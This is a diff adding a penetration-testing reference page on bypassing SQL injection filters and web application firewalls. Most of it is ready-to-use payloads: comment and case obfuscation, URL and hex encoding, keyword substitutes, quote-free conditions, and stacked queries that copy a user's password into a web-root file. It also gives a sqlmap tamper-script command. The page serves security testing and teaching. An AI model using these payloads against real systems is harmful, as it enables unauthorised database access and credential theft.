@@ -1,0 +1,280 @@
+---
+title: SQLi Filter & WAF Bypasses
+description: Evading input filters, blocklists, and web application firewalls.
+mitre: [T1190, T1027]
+d3fend: [D3-MH, D3-MA]
+impact: [DataExfil]
+owasp: [A05]
+sidebar:
+  order: 12
+  label: Bypasses
+---
+import { Aside } from '@astrojs/starlight/components';
+
+When a payload is rejected, the application is filtering input or a WAF is sitting in front. The fix is rarely a single trick - chain multiple obfuscations until something gets through.
+
+## TL;DR
+
+```sql
+-- Case manipulation
+SeLeCt UnIoN
+
+-- Inline comments
+SEL/**/ECT  UN/**/ION
+SE%00LECT       (null byte)
+/*!50000SELECT*/   (MySQL versioned comment)
+
+-- Encoding
+%27         (URL-encoded ')
+%2527       (double URL-encoded)
+0x61646d696e   (hex literal for "admin")
+CHAR(97,100,109,105,110)   (char codes for "admin")
+
+-- Whitespace alternatives
+%09 (tab) %0A (LF) %0B (VT) %0C (FF) %0D (CR) %A0 (NBSP) %20 (space)
+/**/   (comment as separator)
++      (in URL context)
+
+-- Keyword alternatives
+&&   ||   instead of AND/OR
+=    LIKE
+!=   <>   NOT IN
+```
+
+## Strategy
+
+Filters and WAFs operate at different layers:
+
+| Layer | What it does | What bypasses it |
+|---|---|---|
+| Input validation (regex blocklist) | Rejects strings matching patterns | Encoding, case, comments, alt keywords |
+| WAF (signature-based) | Pattern-matches known SQLi shapes | Restructuring queries, encoding, fragmenting |
+| WAF (positive model) | Only allows expected characters | Hard to bypass; look for unprotected endpoints |
+| Type casting | Forces input to int | Find a string-typed parameter instead |
+| Parameterised queries | Treats input as data | Not bypassable; find another sink |
+
+<Aside type="tip">
+Always test which layer is rejecting the payload. Stripped chars vs. blocked request vs. modified response all need different bypasses.
+</Aside>
+
+## Case manipulation
+
+Most signature-based filters are case-insensitive, but some aren't (especially custom blocklists):
+
+```sql
+SELECT  →  SeLeCt   sElEcT   SELECt
+UNION   →  UnIoN    uNiOn
+WHERE   →  WhErE
+```
+
+Test by sending the same payload in mixed case. If it works in mixed but not in lowercase, the filter is case-sensitive.
+
+## Comments as obfuscation
+
+Comments inside keywords break naive blocklists:
+
+```sql
+-- MySQL inline comments
+UN/**/ION SE/**/LECT
+/**/UNION/**/SELECT/**/
+
+-- MySQL versioned comment (executed only in MySQL)
+/*!UNION*/ /*!SELECT*/
+/*!50000UNION*/ /*!50000SELECT*/    -- version-gated to MySQL >= 5.0.0
+
+-- All DBMS line comment
+SELECT-- comment
+FROM users
+```
+
+<Aside type="tip">
+Versioned comments are MySQL-specific and frequently bypass WAFs that only check for `UNION SELECT` as a contiguous string.
+</Aside>
+
+## Whitespace alternatives
+
+When spaces are stripped or trigger detection:
+
+| Substitute | Notes |
+|---|---|
+| `/**/` | Inline C-style comment, treated as whitespace |
+| `+` | URL space encoding |
+| `%09` (tab) | Often unfiltered |
+| `%0A` (LF), `%0D` (CR) | Newlines |
+| `%0B` (VT), `%0C` (FF) | Less common, often unfiltered |
+| `%A0` (NBSP) | Non-breaking space |
+| `()` | Wrap operands to remove space need |
+
+Example without spaces:
+
+```sql
+'/**/UNION/**/SELECT/**/NULL,user(),NULL/**/FROM/**/dual-- -
+'UNION(SELECT(NULL),(user()),(NULL))-- -
+```
+
+The second form uses parens instead of spaces entirely.
+
+## Encoding
+
+URL encoding is the first try; double-encoding catches WAFs that decode once and then check:
+
+```
+'  →  %27   →  %2527
+"  →  %22   →  %2522
+=  →  %3D   →  %253D
+```
+
+Other encodings:
+
+```sql
+-- MySQL hex literal (for strings)
+WHERE username = 0x61646d696e            -- "admin"
+WHERE username = 0x61646D696E
+
+-- char-by-char
+WHERE username = CHAR(97,100,109,105,110)
+WHERE username = CONCAT(CHAR(97),CHAR(100))
+
+-- Unicode in some contexts
+%u0027   (some old IIS / .NET stacks)
+```
+
+For strings, `0x...` (MySQL/MSSQL) and `CHR(N)` (Oracle, PostgreSQL) sidestep quote filtering entirely:
+
+```sql
+-- Original
+' OR username = 'admin
+
+-- Without quotes
+' OR username = 0x61646d696e
+' OR username = CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))
+```
+
+## Keyword alternatives
+
+When specific keywords are blocked:
+
+| Blocked | Try instead |
+|---|---|
+| `AND` | `&&` (MySQL), `%26%26` |
+| `OR` | `\|\|`, `%7C%7C` (PostgreSQL/Oracle/SQLite/MySQL with PIPES_AS_CONCAT off) |
+| `=` | `LIKE` (with no wildcards behaves like `=`), `<=>` (MySQL null-safe equal), `BETWEEN x AND x` |
+| `SUBSTRING` | `MID()`, `SUBSTR()`, `LEFT()`, `RIGHT()` |
+| `CONCAT` | `\|\|` concat, `+` concat (MSSQL), `CONCAT_WS` |
+| `SLEEP` | `BENCHMARK(10000000, MD5(1))` (MySQL), heavy-query alternatives |
+| `UNION SELECT` | `UNION ALL SELECT`, versioned comment wrap |
+| `information_schema` | `mysql.innodb_table_stats` (MySQL), `pg_class` (PostgreSQL), `sys.tables` (MSSQL) |
+| `database()` | `schema()`, `@@database` |
+
+## Logical bypass examples
+
+```sql
+-- Original blocked
+1 OR 1=1
+1' OR '1'='1
+
+-- Alternatives
+1 OR 2=2
+1 OR true
+1 OR 0x01=0x01
+1 OR 'a' LIKE 'a'
+1 OR 1 BETWEEN 0 AND 2
+1 || 1=1
+1 %7C%7C 1=1
+```
+
+## Bypassing length limits
+
+Some inputs are truncated to N characters. Restructure to fit:
+
+```sql
+-- Long form (50+ chars)
+' UNION SELECT username,password FROM users WHERE id=1-- -
+
+-- Compact form
+' UNION SELECT * FROM users-- -
+'OR/**/1-- -
+```
+
+Or use stacked queries to set up state first:
+
+```sql
+'; SET @x=(SELECT password FROM users WHERE username='admin')-- -
+-- (next request)
+'; SELECT @x INTO OUTFILE '/var/www/html/p.txt'-- -
+```
+
+## Bypassing quote filters
+
+When `'` and `"` are stripped or escaped:
+
+```sql
+-- Hex literal - no quotes needed
+' OR username=0x61646d696e
+
+-- char codes
+' OR username=CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))
+
+-- Numeric injection (when the parameter is unquoted)
+1 OR id=(SELECT id FROM users WHERE username=0x61646d696e)
+```
+
+If the application escapes `'` to `\'`, try a backslash to escape the escape:
+
+```sql
+-- Original input becomes: WHERE x='\''
+-- Better: append your own backslash
+\' OR 1=1-- -
+-- App sees \' (escaped backslash) followed by ', which terminates the string
+```
+
+This works against naive `addslashes()` implementations on multi-byte charsets.
+
+## sqlmap tamper scripts
+
+`sqlmap` ships with tamper scripts that automate common bypasses:
+
+```bash
+sqlmap -u "https://<TARGET>/page?id=1" --tamper=between,randomcase,space2comment
+```
+
+Useful tamper scripts:
+
+| Script | Effect |
+|---|---|
+| `space2comment` | Replaces spaces with `/**/` |
+| `space2plus` | Replaces spaces with `+` |
+| `space2randomblank` | Random whitespace chars |
+| `randomcase` | Randomises keyword case |
+| `between` | Replaces `>` with `NOT BETWEEN 0 AND` |
+| `charencode` | URL-encodes all chars |
+| `charunicodeencode` | Unicode-encodes |
+| `apostrophenullencode` | `'` → `%00%27` |
+| `equaltolike` | Replaces `=` with `LIKE` |
+| `versionedmorekeywords` | Wraps keywords in `/*!50000...*/` |
+| `modsecurityversioned` | ModSecurity-targeted versioned comment |
+
+List all: `sqlmap --list-tampers`. Combine multiple with commas.
+
+## Detecting which layer is filtering
+
+Send a deliberately malformed payload and observe:
+
+| Response | Meaning |
+|---|---|
+| Application error page | App-level rejection (custom validation) |
+| Generic "Forbidden" / "Bad Request" / 403 | WAF rejection |
+| HTTP 200 with normal page (no injection) | Input silently stripped |
+| HTTP 200 with sanitised input echoed back | Input modified by the app |
+| Connection reset | Aggressive WAF or IPS |
+
+<Aside type="tip">
+WAF blocks usually have distinctive behaviour: a generic error page, a unique HTTP status, or a "request was blocked" string. Once you identify which WAF (Cloudflare, Akamai, AWS WAF, ModSecurity, Imperva), search for known bypass techniques specific to that product.
+</Aside>
+
+## Notes
+
+- Bypass discovery is often more art than science. Stack obfuscations: case + comments + encoding + alternate keywords often beats filters that block any single technique.
+- If you can't bypass the WAF, look for unprotected endpoints - internal APIs, admin panels, second-order injection points where the storage path is filtered but the trigger path is not.
+- Some WAFs only inspect the first N bytes of a request. Padding the payload with thousands of safe characters before the injection occasionally bypasses byte-limited inspection.
+- Time spent bypassing a strong WAF is sometimes better spent looking for a different vulnerability class. WAFs rarely cover everything; an XSS or SSRF on the same target is often easier to find than an SQLi bypass.
